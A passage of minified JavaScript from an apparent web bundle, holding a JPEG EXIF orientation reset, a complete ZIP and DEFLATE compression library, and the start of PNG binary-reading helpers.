              c = i + u + 2 + 12 * r.getUint16(i + u, a);
            for (let t = i + u + 2; t < c; t += 12)
              if (274 == r.getUint16(t, a)) {
                if (3 !== r.getUint16(t + 2, a))
                  return n("Orientation data type is invalid");
                if (1 !== r.getUint32(t + 4, a))
                  return n("Orientation data count is invalid");
                r.setUint16(t + 8, 1, a);
                break;
              }
            return e(t.slice(o, o + 2 + s));
          }
          o += 2 + s;
        }
        return e(new Blob());
      }),
        r.readAsArrayBuffer(t);
    });
  var YP = {},
    QP = {
      get exports() {
        return YP;
      },
      set exports(t) {
        YP = t;
      },
    };
  !(function () {
    var t,
      e,
      n = {};
    (QP.exports = n),
      (n.parse = function (t, e) {
        for (
          var r = n.bin.readUshort,
            o = n.bin.readUint,
            i = 0,
            s = {},
            a = new Uint8Array(t),
            u = a.length - 4;
          101010256 != o(a, u);

        )
          u--;
        (i = u), (i += 4);
        var c = r(a, (i += 4));
        r(a, (i += 2));
        var l = o(a, (i += 2)),
          d = o(a, (i += 4));
        (i += 4), (i = d);
        for (var f = 0; f < c; f++) {
          o(a, i),
            (i += 4),
            (i += 4),
            (i += 4),
            o(a, (i += 4)),
            (l = o(a, (i += 4)));
          var h = o(a, (i += 4)),
            p = r(a, (i += 4)),
            m = r(a, i + 2),
            g = r(a, i + 4);
          i += 6;
          var y = o(a, (i += 8));
          (i += 4), (i += p + m + g), n._readLocal(a, y, s, l, h, e);
        }
        return s;
      }),
      (n._readLocal = function (t, e, r, o, i, s) {
        var a = n.bin.readUshort,
          u = n.bin.readUint;
        u(t, e), a(t, (e += 4)), a(t, (e += 2));
        var c = a(t, (e += 2));
        u(t, (e += 2)), u(t, (e += 4)), (e += 4);
        var l = a(t, (e += 8)),
          d = a(t, (e += 2));
        e += 2;
        var f = n.bin.readUTF8(t, e, l);
        if (((e += l), (e += d), s)) r[f] = { size: i, csize: o };
        else {
          var h = new Uint8Array(t.buffer, e);
          if (0 == c) r[f] = new Uint8Array(h.buffer.slice(e, e + o));
          else {
            if (8 != c) throw "unknown compression method: " + c;
            var p = new Uint8Array(i);
            n.inflateRaw(h, p), (r[f] = p);
          }
        }
      }),
      (n.inflateRaw = function (t, e) {
        return n.F.inflate(t, e);
      }),
      (n.inflate = function (t, e) {
        return (
          t[0],
          t[1],
          n.inflateRaw(
            new Uint8Array(t.buffer, t.byteOffset + 2, t.length - 6),
            e
          )
        );
      }),
      (n.deflate = function (t, e) {
        null == e && (e = { level: 6 });
        var r = 0,
          o = new Uint8Array(50 + Math.floor(1.1 * t.length));
        (o[r] = 120),
          (o[r + 1] = 156),
          (r += 2),
          (r = n.F.deflateRaw(t, o, r, e.level));
        var i = n.adler(t, 0, t.length);
        return (
          (o[r + 0] = (i >>> 24) & 255),
          (o[r + 1] = (i >>> 16) & 255),
          (o[r + 2] = (i >>> 8) & 255),
          (o[r + 3] = (i >>> 0) & 255),
          new Uint8Array(o.buffer, 0, r + 4)
        );
      }),
      (n.deflateRaw = function (t, e) {
        null == e && (e = { level: 6 });
        var r = new Uint8Array(50 + Math.floor(1.1 * t.length)),
          o = n.F.deflateRaw(t, r, o, e.level);
        return new Uint8Array(r.buffer, 0, o);
      }),
      (n.encode = function (t, e) {
        null == e && (e = !1);
        var r = 0,
          o = n.bin.writeUint,
          i = n.bin.writeUshort,
          s = {};
        for (var a in t) {
          var u = !n._noNeed(a) && !e,
            c = t[a],
            l = n.crc.crc(c, 0, c.length);
          s[a] = {
            cpr: u,
            usize: c.length,
            crc: l,
            file: u ? n.deflateRaw(c) : c,
          };
        }
        for (var a in s)
          r += s[a].file.length + 30 + 46 + 2 * n.bin.sizeUTF8(a);
        r += 22;
        var d = new Uint8Array(r),
          f = 0,
          h = [];
        for (var a in s) {
          var p = s[a];
          h.push(f), (f = n._writeHeader(d, f, a, p, 0));
        }
        var m = 0,
          g = f;
        for (var a in s)
          (p = s[a]), h.push(f), (f = n._writeHeader(d, f, a, p, 1, h[m++]));
        var y = f - g;
        return (
          o(d, f, 101010256),
          (f += 4),
          i(d, (f += 4), m),
          i(d, (f += 2), m),
          o(d, (f += 2), y),
          o(d, (f += 4), g),
          (f += 4),
          (f += 2),
          d.buffer
        );
      }),
      (n._noNeed = function (t) {
        var e = t.split(".").pop().toLowerCase();
        return -1 != "png,jpg,jpeg,zip".indexOf(e);
      }),
      (n._writeHeader = function (t, e, r, o, i, s) {
        var a = n.bin.writeUint,
          u = n.bin.writeUshort,
          c = o.file;
        return (
          a(t, e, 0 == i ? 67324752 : 33639248),
          (e += 4),
          1 == i && (e += 2),
          u(t, e, 20),
          u(t, (e += 2), 0),
          u(t, (e += 2), o.cpr ? 8 : 0),
          a(t, (e += 2), 0),
          a(t, (e += 4), o.crc),
          a(t, (e += 4), c.length),
          a(t, (e += 4), o.usize),
          u(t, (e += 4), n.bin.sizeUTF8(r)),
          u(t, (e += 2), 0),
          (e += 2),
          1 == i && ((e += 2), (e += 2), a(t, (e += 6), s), (e += 4)),
          (e += n.bin.writeUTF8(t, e, r)),
          0 == i && (t.set(c, e), (e += c.length)),
          e
        );
      }),
      (n.crc = {
        table: (function () {
          for (var t = new Uint32Array(256), e = 0; e < 256; e++) {
            for (var n = e, r = 0; r < 8; r++)
              1 & n ? (n = 3988292384 ^ (n >>> 1)) : (n >>>= 1);
            t[e] = n;
          }
          return t;
        })(),
        update: function (t, e, r, o) {
          for (var i = 0; i < o; i++)
            t = n.crc.table[255 & (t ^ e[r + i])] ^ (t >>> 8);
          return t;
        },
        crc: function (t, e, r) {
          return 4294967295 ^ n.crc.update(4294967295, t, e, r);
        },
      }),
      (n.adler = function (t, e, n) {
        for (var r = 1, o = 0, i = e, s = e + n; i < s; ) {
          for (var a = Math.min(i + 5552, s); i < a; ) o += r += t[i++];
          (r %= 65521), (o %= 65521);
        }
        return (o << 16) | r;
      }),
      (n.bin = {
        readUshort: function (t, e) {
          return t[e] | (t[e + 1] << 8);
        },
        writeUshort: function (t, e, n) {
          (t[e] = 255 & n), (t[e + 1] = (n >> 8) & 255);
        },
        readUint: function (t, e) {
          return (
            16777216 * t[e + 3] + ((t[e + 2] << 16) | (t[e + 1] << 8) | t[e])
          );
        },
        writeUint: function (t, e, n) {
          (t[e] = 255 & n),
            (t[e + 1] = (n >> 8) & 255),
            (t[e + 2] = (n >> 16) & 255),
            (t[e + 3] = (n >> 24) & 255);
        },
        readASCII: function (t, e, n) {
          for (var r = "", o = 0; o < n; o++)
            r += String.fromCharCode(t[e + o]);
          return r;
        },
        writeASCII: function (t, e, n) {
          for (var r = 0; r < n.length; r++) t[e + r] = n.charCodeAt(r);
        },
        pad: function (t) {
          return t.length < 2 ? "0" + t : t;
        },
        readUTF8: function (t, e, r) {
          for (var o, i = "", s = 0; s < r; s++)
            i += "%" + n.bin.pad(t[e + s].toString(16));
          try {
            o = decodeURIComponent(i);
          } catch (a) {
            return n.bin.readASCII(t, e, r);
          }
          return o;
        },
        writeUTF8: function (t, e, n) {
          for (var r = n.length, o = 0, i = 0; i < r; i++) {
            var s = n.charCodeAt(i);
            if (4294967168 & s)
              if (4294965248 & s)
                if (4294901760 & s) {
                  if (4292870144 & s) throw "e";
                  (t[e + o] = 240 | (s >> 18)),
                    (t[e + o + 1] = 128 | ((s >> 12) & 63)),
                    (t[e + o + 2] = 128 | ((s >> 6) & 63)),
                    (t[e + o + 3] = 128 | (63 & s)),
                    (o += 4);
                } else
                  (t[e + o] = 224 | (s >> 12)),
                    (t[e + o + 1] = 128 | ((s >> 6) & 63)),
                    (t[e + o + 2] = 128 | (63 & s)),
                    (o += 3);
              else
                (t[e + o] = 192 | (s >> 6)),
                  (t[e + o + 1] = 128 | (63 & s)),
                  (o += 2);
            else (t[e + o] = s), o++;
          }
          return o;
        },
        sizeUTF8: function (t) {
          for (var e = t.length, n = 0, r = 0; r < e; r++) {
            var o = t.charCodeAt(r);
            if (4294967168 & o)
              if (4294965248 & o)
                if (4294901760 & o) {
                  if (4292870144 & o) throw "e";
                  n += 4;
                } else n += 3;
              else n += 2;
            else n++;
          }
          return n;
        },
      }),
      (n.F = {}),
      (n.F.deflateRaw = function (t, e, r, o) {
        var i = [
            [0, 0, 0, 0, 0],
            [4, 4, 8, 4, 0],
            [4, 5, 16, 8, 0],
            [4, 6, 16, 16, 0],
            [4, 10, 16, 32, 0],
            [8, 16, 32, 32, 0],
            [8, 16, 128, 128, 0],
            [8, 32, 128, 256, 0],
            [32, 128, 258, 1024, 1],
            [32, 258, 258, 4096, 1],
          ][o],
          s = n.F.U,
          a = n.F._goodIndex;
        n.F._hash;
        var u = n.F._putsE,
          c = 0,
          l = r << 3,
          d = 0,
          f = t.length;
        if (0 == o) {
          for (; c < f; )
            u(e, l, c + (S = Math.min(65535, f - c)) == f ? 1 : 0),
              (l = n.F._copyExact(t, c, S, e, l + 8)),
              (c += S);
          return l >>> 3;
        }
        var h = s.lits,
          p = s.strt,
          m = s.prev,
          g = 0,
          y = 0,
          w = 0,
          b = 0,
          v = 0,
          A = 0;
        for (f > 2 && (p[(A = n.F._hash(t, 0))] = 0), c = 0; c < f; c++) {
          if (((v = A), c + 1 < f - 2)) {
            A = n.F._hash(t, c + 1);
            var k = (c + 1) & 32767;
            (m[k] = p[A]), (p[A] = k);
          }
          if (d <= c) {
            (g > 14e3 || y > 26697) &&
              f - c > 100 &&
              (d < c && ((h[g] = c - d), (g += 2), (d = c)),
              (l = n.F._writeBlock(
                c == f - 1 || d == f ? 1 : 0,
                h,
                g,
                b,
                t,
                w,
                c - w,
                e,
                l
              )),
              (g = y = b = 0),
              (w = c));
            var I = 0;
            c < f - 2 &&
              (I = n.F._bestMatch(t, c, m, v, Math.min(i[2], f - c), i[3]));
            var S = I >>> 16,
              _ = 65535 & I;
            if (0 != I) {
              _ = 65535 & I;
              var T = a((S = I >>> 16), s.of0);
              s.lhst[257 + T]++;
              var C = a(_, s.df0);
              s.dhst[C]++,
                (b += s.exb[T] + s.dxb[C]),
                (h[g] = (S << 23) | (c - d)),
                (h[g + 1] = (_ << 16) | (T << 8) | C),
                (g += 2),
                (d = c + S);
            } else s.lhst[t[c]]++;
            y++;
          }
        }
        for (
          (w == c && 0 != t.length) ||
          (d < c && ((h[g] = c - d), (g += 2), (d = c)),
          (l = n.F._writeBlock(1, h, g, b, t, w, c - w, e, l)),
          (g = 0),
          (y = 0),
          (g = y = b = 0),
          (w = c));
          7 & l;

        )
          l++;
        return l >>> 3;
      }),
      (n.F._bestMatch = function (t, e, r, o, i, s) {
        var a = 32767 & e,
          u = r[a],
          c = (a - u + 32768) & 32767;
        if (u == a || o != n.F._hash(t, e - c)) return 0;
        for (
          var l = 0, d = 0, f = Math.min(32767, e);
          c <= f && 0 != --s && u != a;

        ) {
          if (0 == l || t[e + l] == t[e + l - c]) {
            var h = n.F._howLong(t, e, c);
            if (h > l) {
              if (((d = c), (l = h) >= i)) break;
              c + 2 < h && (h = c + 2);
              for (var p = 0, m = 0; m < h - 2; m++) {
                var g = (e - c + m + 32768) & 32767,
                  y = (g - r[g] + 32768) & 32767;
                y > p && ((p = y), (u = g));
              }
            }
          }
          c += ((a = u) - (u = r[a]) + 32768) & 32767;
        }
        return (l << 16) | d;
      }),
      (n.F._howLong = function (t, e, n) {
        if (
          t[e] != t[e - n] ||
          t[e + 1] != t[e + 1 - n] ||
          t[e + 2] != t[e + 2 - n]
        )
          return 0;
        var r = e,
          o = Math.min(t.length, e + 258);
        for (e += 3; e < o && t[e] == t[e - n]; ) e++;
        return e - r;
      }),
      (n.F._hash = function (t, e) {
        return (((t[e] << 8) | t[e + 1]) + (t[e + 2] << 4)) & 65535;
      }),
      (n.saved = 0),
      (n.F._writeBlock = function (t, e, r, o, i, s, a, u, c) {
        var l,
          d,
          f,
          h,
          p,
          m,
          g,
          y,
          w,
          b = n.F.U,
          v = n.F._putsF,
          A = n.F._putsE;
        b.lhst[256]++,
          (d = (l = n.F.getTrees())[0]),
          (f = l[1]),
          (h = l[2]),
          (p = l[3]),
          (m = l[4]),
          (g = l[5]),
          (y = l[6]),
          (w = l[7]);
        var k = 32 + ((c + 3) & 7 ? 8 - ((c + 3) & 7) : 0) + (a << 3),
          I =
            o + n.F.contSize(b.fltree, b.lhst) + n.F.contSize(b.fdtree, b.dhst),
          S = o + n.F.contSize(b.ltree, b.lhst) + n.F.contSize(b.dtree, b.dhst);
        S +=
          14 +
          3 * g +
          n.F.contSize(b.itree, b.ihst) +
          (2 * b.ihst[16] + 3 * b.ihst[17] + 7 * b.ihst[18]);
        for (var _ = 0; _ < 286; _++) b.lhst[_] = 0;
        for (_ = 0; _ < 30; _++) b.dhst[_] = 0;
        for (_ = 0; _ < 19; _++) b.ihst[_] = 0;
        var T = k < I && k < S ? 0 : I < S ? 1 : 2;
        if ((v(u, c, t), v(u, c + 1, T), (c += 3), 0 == T)) {
          for (; 7 & c; ) c++;
          c = n.F._copyExact(i, s, a, u, c);
        } else {
          var C, B;
          if ((1 == T && ((C = b.fltree), (B = b.fdtree)), 2 == T)) {
            n.F.makeCodes(b.ltree, d),
              n.F.revCodes(b.ltree, d),
              n.F.makeCodes(b.dtree, f),
              n.F.revCodes(b.dtree, f),
              n.F.makeCodes(b.itree, h),
              n.F.revCodes(b.itree, h),
              (C = b.ltree),
              (B = b.dtree),
              A(u, c, p - 257),
              A(u, (c += 5), m - 1),
              A(u, (c += 5), g - 4),
              (c += 4);
            for (var E = 0; E < g; E++)
              A(u, c + 3 * E, b.itree[1 + (b.ordr[E] << 1)]);
            (c += 3 * g),
              (c = n.F._codeTiny(y, b.itree, u, c)),
              (c = n.F._codeTiny(w, b.itree, u, c));
          }
          for (var x = s, P = 0; P < r; P += 2) {
            for (var R = e[P], O = R >>> 23, M = x + (8388607 & R); x < M; )
              c = n.F._writeLit(i[x++], C, u, c);
            if (0 != O) {
              var L = e[P + 1],
                N = L >> 16,
                D = (L >> 8) & 255,
                U = 255 & L;
              A(u, (c = n.F._writeLit(257 + D, C, u, c)), O - b.of0[D]),
                (c += b.exb[D]),
                v(u, (c = n.F._writeLit(U, B, u, c)), N - b.df0[U]),
                (c += b.dxb[U]),
                (x += O);
            }
          }
          c = n.F._writeLit(256, C, u, c);
        }
        return c;
      }),
      (n.F._copyExact = function (t, e, n, r, o) {
        var i = o >>> 3;
        return (
          (r[i] = n),
          (r[i + 1] = n >>> 8),
          (r[i + 2] = 255 - r[i]),
          (r[i + 3] = 255 - r[i + 1]),
          (i += 4),
          r.set(new Uint8Array(t.buffer, e, n), i),
          o + ((n + 4) << 3)
        );
      }),
      (n.F.getTrees = function () {
        for (
          var t = n.F.U,
            e = n.F._hufTree(t.lhst, t.ltree, 15),
            r = n.F._hufTree(t.dhst, t.dtree, 15),
            o = [],
            i = n.F._lenCodes(t.ltree, o),
            s = [],
            a = n.F._lenCodes(t.dtree, s),
            u = 0;
          u < o.length;
          u += 2
        )
          t.ihst[o[u]]++;
        for (u = 0; u < s.length; u += 2) t.ihst[s[u]]++;
        for (
          var c = n.F._hufTree(t.ihst, t.itree, 7), l = 19;
          l > 4 && 0 == t.itree[1 + (t.ordr[l - 1] << 1)];

        )
          l--;
        return [e, r, c, i, a, l, o, s];
      }),
      (n.F.getSecond = function (t) {
        for (var e = [], n = 0; n < t.length; n += 2) e.push(t[n + 1]);
        return e;
      }),
      (n.F.nonZero = function (t) {
        for (var e = "", n = 0; n < t.length; n += 2)
          0 != t[n + 1] && (e += (n >> 1) + ",");
        return e;
      }),
      (n.F.contSize = function (t, e) {
        for (var n = 0, r = 0; r < e.length; r++) n += e[r] * t[1 + (r << 1)];
        return n;
      }),
      (n.F._codeTiny = function (t, e, r, o) {
        for (var i = 0; i < t.length; i += 2) {
          var s = t[i],
            a = t[i + 1];
          o = n.F._writeLit(s, e, r, o);
          var u = 16 == s ? 2 : 17 == s ? 3 : 7;
          s > 15 && (n.F._putsE(r, o, a, u), (o += u));
        }
        return o;
      }),
      (n.F._lenCodes = function (t, e) {
        for (var n = t.length; 2 != n && 0 == t[n - 1]; ) n -= 2;
        for (var r = 0; r < n; r += 2) {
          var o = t[r + 1],
            i = r + 3 < n ? t[r + 3] : -1,
            s = r + 5 < n ? t[r + 5] : -1,
            a = 0 == r ? -1 : t[r - 1];
          if (0 == o && i == o && s == o) {
            for (var u = r + 5; u + 2 < n && t[u + 2] == o; ) u += 2;
            (c = Math.min((u + 1 - r) >>> 1, 138)) < 11
              ? e.push(17, c - 3)
              : e.push(18, c - 11),
              (r += 2 * c - 2);
          } else if (o == a && i == o && s == o) {
            for (u = r + 5; u + 2 < n && t[u + 2] == o; ) u += 2;
            var c = Math.min((u + 1 - r) >>> 1, 6);
            e.push(16, c - 3), (r += 2 * c - 2);
          } else e.push(o, 0);
        }
        return n >>> 1;
      }),
      (n.F._hufTree = function (t, e, r) {
        var o = [],
          i = t.length,
          s = e.length,
          a = 0;
        for (a = 0; a < s; a += 2) (e[a] = 0), (e[a + 1] = 0);
        for (a = 0; a < i; a++) 0 != t[a] && o.push({ lit: a, f: t[a] });
        var u = o.length,
          c = o.slice(0);
        if (0 == u) return 0;
        if (1 == u) {
          var l = o[0].lit;
          return (
            (c = 0 == l ? 1 : 0),
            (e[1 + (l << 1)] = 1),
            (e[1 + (c << 1)] = 1),
            1
          );
        }
        o.sort(function (t, e) {
          return t.f - e.f;
        });
        var d = o[0],
          f = o[1],
          h = 0,
          p = 1,
          m = 2;
        for (o[0] = { lit: -1, f: d.f + f.f, l: d, r: f, d: 0 }; p != u - 1; )
          (d = h != p && (m == u || o[h].f < o[m].f) ? o[h++] : o[m++]),
            (f = h != p && (m == u || o[h].f < o[m].f) ? o[h++] : o[m++]),
            (o[p++] = { lit: -1, f: d.f + f.f, l: d, r: f });
        var g = n.F.setDepth(o[p - 1], 0);
        for (g > r && (n.F.restrictDepth(c, r, g), (g = r)), a = 0; a < u; a++)
          e[1 + (c[a].lit << 1)] = c[a].d;
        return g;
      }),
      (n.F.setDepth = function (t, e) {
        return -1 != t.lit
          ? ((t.d = e), e)
          : Math.max(n.F.setDepth(t.l, e + 1), n.F.setDepth(t.r, e + 1));
      }),
      (n.F.restrictDepth = function (t, e, n) {
        var r = 0,
          o = 1 << (n - e),
          i = 0;
        for (
          t.sort(function (t, e) {
            return e.d == t.d ? t.f - e.f : e.d - t.d;
          }),
            r = 0;
          r < t.length && t[r].d > e;
          r++
        ) {
          var s = t[r].d;
          (t[r].d = e), (i += o - (1 << (n - s)));
        }
        for (i >>>= n - e; i > 0; )
          (s = t[r].d) < e ? (t[r].d++, (i -= 1 << (e - s - 1))) : r++;
        for (; r >= 0; r--) t[r].d == e && i < 0 && (t[r].d--, i++);
        0 != i, 0;
      }),
      (n.F._goodIndex = function (t, e) {
        var n = 0;
        return (
          e[16 | n] <= t && (n |= 16),
          e[8 | n] <= t && (n |= 8),
          e[4 | n] <= t && (n |= 4),
          e[2 | n] <= t && (n |= 2),
          e[1 | n] <= t && (n |= 1),
          n
        );
      }),
      (n.F._writeLit = function (t, e, r, o) {
        return n.F._putsF(r, o, e[t << 1]), o + e[1 + (t << 1)];
      }),
      (n.F.inflate = function (t, e) {
        var r = Uint8Array;
        if (3 == t[0] && 0 == t[1]) return e || new r(0);
        var o = n.F,
          i = o._bitsF,
          s = o._bitsE,
          a = o._decodeTiny,
          u = o.makeCodes,
          c = o.codes2map,
          l = o._get17,
          d = o.U,
          f = null == e;
        f && (e = new r((t.length >>> 2) << 3));
        for (
          var h,
            p,
            m = 0,
            g = 0,
            y = 0,
            w = 0,
            b = 0,
            v = 0,
            A = 0,
            k = 0,
            I = 0;
          0 == m;

        )
          if (((m = i(t, I, 1)), (g = i(t, I + 1, 2)), (I += 3), 0 != g)) {
            if (
              (f && (e = n.F._check(e, k + (1 << 17))),
              1 == g && ((h = d.flmap), (p = d.fdmap), (v = 511), (A = 31)),
              2 == g)
            ) {
              (y = s(t, I, 5) + 257),
                (w = s(t, I + 5, 5) + 1),
                (b = s(t, I + 10, 4) + 4),
                (I += 14);
              for (var S = 0; S < 38; S += 2)
                (d.itree[S] = 0), (d.itree[S + 1] = 0);
              var _ = 1;
              for (S = 0; S < b; S++) {
                var T = s(t, I + 3 * S, 3);
                (d.itree[1 + (d.ordr[S] << 1)] = T), T > _ && (_ = T);
              }
              (I += 3 * b),
                u(d.itree, _),
                c(d.itree, _, d.imap),
                (h = d.lmap),
                (p = d.dmap),
                (I = a(d.imap, (1 << _) - 1, y + w, t, I, d.ttree));
              var C = o._copyOut(d.ttree, 0, y, d.ltree);
              v = (1 << C) - 1;
              var B = o._copyOut(d.ttree, y, w, d.dtree);
              (A = (1 << B) - 1),
                u(d.ltree, C),
                c(d.ltree, C, h),
                u(d.dtree, B),
                c(d.dtree, B, p);
            }
            for (;;) {
              var E = h[l(t, I) & v];
              I += 15 & E;
              var x = E >>> 4;
              if (x >>> 8 == 0) e[k++] = x;
              else {
                if (256 == x) break;
                var P = k + x - 254;
                if (x > 264) {
                  var R = d.ldef[x - 257];
                  (P = k + (R >>> 3) + s(t, I, 7 & R)), (I += 7 & R);
                }
                var O = p[l(t, I) & A];
                I += 15 & O;
                var M = O >>> 4,
                  L = d.ddef[M],
                  N = (L >>> 4) + i(t, I, 15 & L);
                for (
                  I += 15 & L, f && (e = n.F._check(e, k + (1 << 17)));
                  k < P;

                )
                  (e[k] = e[k++ - N]),
                    (e[k] = e[k++ - N]),
                    (e[k] = e[k++ - N]),
                    (e[k] = e[k++ - N]);
                k = P;
              }
            }
          } else {
            7 & I && (I += 8 - (7 & I));
            var D = 4 + (I >>> 3),
              U = t[D - 4] | (t[D - 3] << 8);
            f && (e = n.F._check(e, k + U)),
              e.set(new r(t.buffer, t.byteOffset + D, U), k),
              (I = (D + U) << 3),
              (k += U);
          }
        return e.length == k ? e : e.slice(0, k);
      }),
      (n.F._check = function (t, e) {
        var n = t.length;
        if (e <= n) return t;
        var r = new Uint8Array(Math.max(n << 1, e));
        return r.set(t, 0), r;
      }),
      (n.F._decodeTiny = function (t, e, r, o, i, s) {
        for (var a = n.F._bitsE, u = n.F._get17, c = 0; c < r; ) {
          var l = t[u(o, i) & e];
          i += 15 & l;
          var d = l >>> 4;
          if (d <= 15) (s[c] = d), c++;
          else {
            var f = 0,
              h = 0;
            16 == d
              ? ((h = 3 + a(o, i, 2)), (i += 2), (f = s[c - 1]))
              : 17 == d
              ? ((h = 3 + a(o, i, 3)), (i += 3))
              : 18 == d && ((h = 11 + a(o, i, 7)), (i += 7));
            for (var p = c + h; c < p; ) (s[c] = f), c++;
          }
        }
        return i;
      }),
      (n.F._copyOut = function (t, e, n, r) {
        for (var o = 0, i = 0, s = r.length >>> 1; i < n; ) {
          var a = t[i + e];
          (r[i << 1] = 0), (r[1 + (i << 1)] = a), a > o && (o = a), i++;
        }
        for (; i < s; ) (r[i << 1] = 0), (r[1 + (i << 1)] = 0), i++;
        return o;
      }),
      (n.F.makeCodes = function (t, e) {
        for (
          var r, o, i, s, a = n.F.U, u = t.length, c = a.bl_count, l = 0;
          l <= e;
          l++
        )
          c[l] = 0;
        for (l = 1; l < u; l += 2) c[t[l]]++;
        var d = a.next_code;
        for (r = 0, c[0] = 0, o = 1; o <= e; o++)
          (r = (r + c[o - 1]) << 1), (d[o] = r);
        for (i = 0; i < u; i += 2)
          0 != (s = t[i + 1]) && ((t[i] = d[s]), d[s]++);
      }),
      (n.F.codes2map = function (t, e, r) {
        for (var o = t.length, i = n.F.U.rev15, s = 0; s < o; s += 2)
          if (0 != t[s + 1])
            for (
              var a = s >> 1,
                u = t[s + 1],
                c = (a << 4) | u,
                l = e - u,
                d = t[s] << l,
                f = d + (1 << l);
              d != f;

            )
              (r[i[d] >>> (15 - e)] = c), d++;
      }),
      (n.F.revCodes = function (t, e) {
        for (var r = n.F.U.rev15, o = 15 - e, i = 0; i < t.length; i += 2) {
          var s = t[i] << (e - t[i + 1]);
          t[i] = r[s] >>> o;
        }
      }),
      (n.F._putsE = function (t, e, n) {
        n <<= 7 & e;
        var r = e >>> 3;
        (t[r] |= n), (t[r + 1] |= n >>> 8);
      }),
      (n.F._putsF = function (t, e, n) {
        n <<= 7 & e;
        var r = e >>> 3;
        (t[r] |= n), (t[r + 1] |= n >>> 8), (t[r + 2] |= n >>> 16);
      }),
      (n.F._bitsE = function (t, e, n) {
        return (
          ((t[e >>> 3] | (t[1 + (e >>> 3)] << 8)) >>> (7 & e)) & ((1 << n) - 1)
        );
      }),
      (n.F._bitsF = function (t, e, n) {
        return (
          ((t[e >>> 3] | (t[1 + (e >>> 3)] << 8) | (t[2 + (e >>> 3)] << 16)) >>>
            (7 & e)) &
          ((1 << n) - 1)
        );
      }),
      (n.F._get17 = function (t, e) {
        return (
          (t[e >>> 3] | (t[1 + (e >>> 3)] << 8) | (t[2 + (e >>> 3)] << 16)) >>>
          (7 & e)
        );
      }),
      (n.F._get25 = function (t, e) {
        return (
          (t[e >>> 3] |
            (t[1 + (e >>> 3)] << 8) |
            (t[2 + (e >>> 3)] << 16) |
            (t[3 + (e >>> 3)] << 24)) >>>
          (7 & e)
        );
      }),
      (n.F.U =
        ((t = Uint16Array),
        (e = Uint32Array),
        {
          next_code: new t(16),
          bl_count: new t(16),
          ordr: [
            16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15,
          ],
          of0: [
            3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31, 35, 43, 51,
            59, 67, 83, 99, 115, 131, 163, 195, 227, 258, 999, 999, 999,
          ],
          exb: [
            0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3, 4, 4, 4,
            4, 5, 5, 5, 5, 0, 0, 0, 0,
          ],
          ldef: new t(32),
          df0: [
            1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193, 257, 385,
            513, 769, 1025, 1537, 2049, 3073, 4097, 6145, 8193, 12289, 16385,
            24577, 65535, 65535,
          ],
          dxb: [
            0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 7, 8, 8, 9, 9,
            10, 10, 11, 11, 12, 12, 13, 13, 0, 0,
          ],
          ddef: new e(32),
          flmap: new t(512),
          fltree: [],
          fdmap: new t(32),
          fdtree: [],
          lmap: new t(32768),
          ltree: [],
          ttree: [],
          dmap: new t(32768),
          dtree: [],
          imap: new t(512),
          itree: [],
          rev15: new t(32768),
          lhst: new e(286),
          dhst: new e(30),
          ihst: new e(19),
          lits: new e(15e3),
          strt: new t(65536),
          prev: new t(32768),
        })),
      (function () {
        for (var t = n.F.U, e = 0; e < 32768; e++) {
          var r = e;
          (r =
            ((4278255360 &
              (r =
                ((4042322160 &
                  (r =
                    ((3435973836 &
                      (r =
                        ((2863311530 & r) >>> 1) | ((1431655765 & r) << 1))) >>>
                      2) |
                    ((858993459 & r) << 2))) >>>
                  4) |
                ((252645135 & r) << 4))) >>>
              8) |
            ((16711935 & r) << 8)),
            (t.rev15[e] = ((r >>> 16) | (r << 16)) >>> 17);
        }
        function o(t, e, n) {
          for (; 0 != e--; ) t.push(0, n);
        }
        for (e = 0; e < 32; e++)
          (t.ldef[e] = (t.of0[e] << 3) | t.exb[e]),
            (t.ddef[e] = (t.df0[e] << 4) | t.dxb[e]);
        o(t.fltree, 144, 8),
          o(t.fltree, 112, 9),
          o(t.fltree, 24, 7),
          o(t.fltree, 8, 8),
          n.F.makeCodes(t.fltree, 9),
          n.F.codes2map(t.fltree, 9, t.flmap),
          n.F.revCodes(t.fltree, 9),
          o(t.fdtree, 32, 5),
          n.F.makeCodes(t.fdtree, 5),
          n.F.codes2map(t.fdtree, 5, t.fdmap),
          n.F.revCodes(t.fdtree, 5),
          o(t.itree, 19, 0),
          o(t.ltree, 286, 0),
          o(t.dtree, 30, 0),
          o(t.ttree, 320, 0);
      })();
  })();
  var $P = (function (t, e) {
    return (
      e.forEach(function (e) {
        e &&
          "string" != typeof e &&
          !Array.isArray(e) &&
          Object.keys(e).forEach(function (n) {
            if ("default" !== n && !(n in t)) {
              var r = Object.getOwnPropertyDescriptor(e, n);
              Object.defineProperty(
                t,
                n,
                r.get
                  ? r
                  : {
                      enumerable: !0,
                      get: function () {
                        return e[n];
                      },
                    }
              );
            }
          });
      }),
      Object.freeze(t)
    );
  })({ __proto__: null, default: YP }, [YP]);
  const tR = (function () {
    var t = {
      nextZero(t, e) {
        for (; 0 != t[e]; ) e++;
        return e;
      },
      readUshort: (t, e) => (t[e] << 8) | t[e + 1],
      writeUshort(t, e, n) {
        (t[e] = (n >> 8) & 255), (t[e + 1] = 255 & n);
      },
      readUint: (t, e) =>
        16777216 * t[e] + ((t[e + 1] << 16) | (t[e + 2] << 8) | t[e + 3]),
      writeUint(t, e, n) {
        (t[e] = (n >> 24) & 255),
          (t[e + 1] = (n >> 16) & 255),
          (t[e + 2] = (n >> 8) & 255),
          (t[e + 3] = 255 & n);
      },
      readASCII(t, e, n) {
        let r = "";
        for (let o = 0; o < n; o++) r += String.fromCharCode(t[e + o]);
        return r;
      },
      writeASCII(t, e, n) {
        for (let r = 0; r < n.length; r++) t[e + r] = n.charCodeAt(r);
      },
      readBytes(t, e, n) {
        const r = [];
        for (let o = 0; o < n; o++) r.push(t[e + o]);
        return r;
      },
      pad: (t) => (t.length < 2 ? `0${t}` : t),
      readUTF8(e, n, r) {
        let o,
          i = "";
        for (let a = 0; a < r; a++) i += `%${t.pad(e[n + a].toString(16))}`;
        try {
          o = decodeURIComponent(i);
        } catch (s) {
          return t.readASCII(e, n, r);
        }
        return o;
      },
    };
    function e(e, n, r, o) {
      const s = n * r,
        a = i(o),
        u = Math.ceil((n * a) / 8),
